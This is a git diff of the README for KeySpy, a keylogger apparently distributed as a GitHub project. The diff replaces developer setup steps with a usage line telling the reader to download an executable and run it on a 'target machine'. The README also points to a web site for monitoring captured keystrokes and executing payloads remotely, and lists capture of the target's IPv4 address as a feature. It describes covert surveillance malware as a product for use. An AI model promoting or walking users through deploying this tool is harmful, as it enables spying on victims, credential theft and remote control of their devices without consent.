@@ -30,27 +30,13 @@ KeySpy is a Python keylogger with a web interface for viewing captured keystroke
 - Capture IPv4 address of the target device.
 - Allows viewing keystrokes from multiple sessions.
 
-## D3V-Installation
- 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/3rr0r-505/KeySpy.git
-
-2. Navigate to the project directory:
-   ```bash
-   cd KeySpy
-
-3. Install the required dependencies using pip:
-   ```bash
-   pip install -r requirements.txt
-
 ## Usage
+   ### ⚙️Keylogger:
+   -  Download the [kSpy-AIO.exe](https://github.com/3rr0r-505/KeySpy/releases/download/v1.4.1/kSpy-AIO_v1.4.exe) file & run it on target machine.
    ### 🌐Web Interface:
    - Visit this site [w3blogger.vercel.app](https://w3blogger.vercel.app/) to monitor the keylogs and execute payloads remotely
    
 ## Note
-- For Downloading the `kSpy-AIO.exe` file [click here](https://github.com/3rr0r-505/KeySpy/releases/download/v1.4.1/kSpy-AIO_v1.4.exe) or visit the releases page.
-
 `⚠️ It's a Experimental project inspired by Hak5 OMG & still in development.`
 
 ## Contributing
